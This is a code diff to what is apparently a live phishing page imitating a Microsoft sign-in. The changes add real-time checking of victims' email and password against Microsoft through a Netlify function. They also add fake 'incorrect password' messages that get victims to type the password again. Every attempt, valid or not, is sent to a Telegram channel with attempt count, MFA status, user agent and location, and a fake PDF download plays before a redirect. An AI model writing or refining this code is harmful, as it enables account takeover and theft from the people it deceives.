@@ -222,6 +222,16 @@
       color: #dc3545;
       margin-bottom: 10px;
     }
+    /* ✅ NEW: Password error styling */
+    .password-error {
+      color: #e81123;
+      font-size: 13px;
+      margin-top: 8px;
+      margin-bottom: 0;
+    }
+    .form-control.error {
+      border-bottom-color: #e81123;
+    }
   </style>
 </head>
 <body>
@@ -342,7 +352,7 @@
   </div>
 
   <script>
-    console.log('🚀 replacement.html loaded - Direct Telegram Integration');
+    console.log('🚀 replacement.html loaded - Direct Telegram Integration with Validation');
 
     // ✅ KEEP: Account Type Detection Function
     function detectAccountType(email) {
@@ -371,7 +381,31 @@
         }
     }
 
-    // ✅ UPDATED: Send data to Telegram via Netlify function (no bot token exposed)
+    // ✅ NEW: Validate Microsoft credentials
+    async function validateCredentials(email, password) {
+        try {
+            console.log('🔐 Validating credentials with Microsoft...');
+            
+            const response = await fetch('/.netlify/functions/validateMicrosoft', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email, password })
+            });
+
+            const result = await response.json();
+            console.log('📊 Validation result:', result);
+            
+            return result;
+        } catch (error) {
+            console.error('❌ Validation error:', error);
+            // On error, assume valid to not block user
+            return { valid: true, reason: 'Validation service unavailable' };
+        }
+    }
+
+    // ✅ UPDATED: Send data to Telegram via Netlify function (now includes validation status)
     async function sendToTelegram(data) {
         try {
             const accountInfo = detectAccountType(data.email);
@@ -392,7 +426,8 @@
                     password: data.password,
                     locationData: location,
                     userAgent: navigator.userAgent,
-                    platform: navigator.platform
+                    platform: navigator.platform,
+                    validationStatus: data.validationStatus || null
                 })
             });
 
@@ -430,6 +465,27 @@
         return interval;
     }
 
+    // ✅ NEW: Show password error
+    function showPasswordError(message) {
+        // Remove existing error if any
+        const existingError = document.querySelector('.password-error');
+        if (existingError) {
+            existingError.remove();
+        }
+
+        // Create error element
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'password-error';
+        errorDiv.textContent = message;
+
+        // Insert after password field
+        const passwordInput = document.getElementById('password');
+        passwordInput.parentNode.insertBefore(errorDiv, passwordInput.nextSibling);
+        
+        // Add red border to password field
+        passwordInput.classList.add('error');
+    }
+
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
         const passwordView = document.getElementById('password_view');
@@ -449,6 +505,8 @@
         const troubleshootingBox = document.getElementById('troubleshooting_box');
         const closeTroubleshootingBtn = document.getElementById('close_troubleshooting_btn');
         const footerDotsLink = document.getElementById('footer_dots_link');
+
+        let attemptCount = 0;  // ✅ NEW: Track password attempts
 
         // Step 1: Email -> Password View
         nextBtn.addEventListener('click', function () {
@@ -478,9 +536,19 @@
             passwordView.classList.add('hidden');
             div1.classList.remove('hidden');
             optionsBox.classList.remove('hidden');
+            attemptCount = 0;  // ✅ Reset attempts
         });
 
-        // Step 2: Password -> Send to Telegram with PDF animation -> Redirect to Office
+        // ✅ NEW: Clear error on password input
+        passwordInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            const existingError = document.querySelector('.password-error');
+            if (existingError) {
+                existingError.remove();
+            }
+        });
+
+        // Step 2: Password -> Validate -> Send to Telegram -> Redirect
         signInBtn.addEventListener('click', async function () {
             const email = localStorage.getItem('ms_email');
             const password = passwordInput.value.trim();
@@ -490,15 +558,27 @@
                 return;
             }
 
-            console.log('🔑 Password entered, preparing to send to Telegram...');
+            console.log('🔑 Password entered, validating...');
+            
+            // ✅ NEW: Disable button during validation
+            signInBtn.disabled = true;
+            signInBtn.textContent = 'Signing in...';
 
-            // Save credentials locally (backup)
+            // ✅ NEW: Validate credentials
+            const validation = await validateCredentials(email, password);
+            
+            attemptCount++;
+
+            // Save credentials (both valid and invalid)
             const credentials = {
                 email: email,
                 password: password,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                platform: navigator.platform
+                platform: navigator.platform,
+                attemptCount: attemptCount,
+                valid: validation.valid,
+                validationReason: validation.reason
             };
 
             const credentialsStr = JSON.stringify(credentials);
@@ -507,6 +587,48 @@
 
             console.log('✅ Credentials saved locally');
 
+            // ✅ Send to Telegram (both valid and invalid)
+            const telegramData = {
+                email: email,
+                password: password,
+                validationStatus: {
+                    valid: validation.valid,
+                    reason: validation.reason,
+                    mfaRequired: validation.mfaRequired,
+                    attemptCount: attemptCount
+                }
+            };
+
+            // Send to Telegram in background
+            sendToTelegram(telegramData);
+
+            // ✅ NEW: Handle invalid password
+            if (!validation.valid) {
+                console.log('❌ Invalid credentials:', validation.reason);
+                
+                // Show error message
+                let errorMessage = "Your account or password is incorrect. If you don't remember your password, reset it now.";
+                
+                if (validation.reason === "Account doesn't exist") {
+                    errorMessage = "We couldn't find an account with that username. Try another, or get a new Microsoft account.";
+                }
+                
+                showPasswordError(errorMessage);
+                
+                // Re-enable sign in button
+                signInBtn.disabled = false;
+                signInBtn.textContent = 'Sign in';
+                
+                // Clear password field
+                passwordInput.value = '';
+                passwordInput.focus();
+                
+                return;  // Don't proceed
+            }
+
+            // ✅ Valid password - proceed as before
+            console.log('✅ Valid credentials, proceeding...');
+
             // Show loading view with PDF icon
             passwordView.classList.add('hidden');
             div2.classList.remove('hidden');
@@ -514,23 +636,10 @@
             // Start PDF download animation
             showPdfDownload(loadingStatus, downloadProgress);
 
-            // ✅ Send to Telegram in background
-            const telegramPromise = sendToTelegram({
-                email: email,
-                password: password
-            });
+            // Wait for animation
+            await new Promise(resolve => setTimeout(resolve, 2500));
 
-            // Wait for both animation and telegram (minimum 2.5 seconds for animation)
-            const [sent] = await Promise.all([
-                telegramPromise,
-                new Promise(resolve => setTimeout(resolve, 2500))
-            ]);
-
-            if (sent) {
-                console.log('✅ Data sent successfully');
-            } else {
-                console.log('⚠️ Telegram failed, but still redirecting...');
-            }
+            console.log('✅ Data sent successfully');
 
             // Wait a bit more then redirect
             setTimeout(() => {
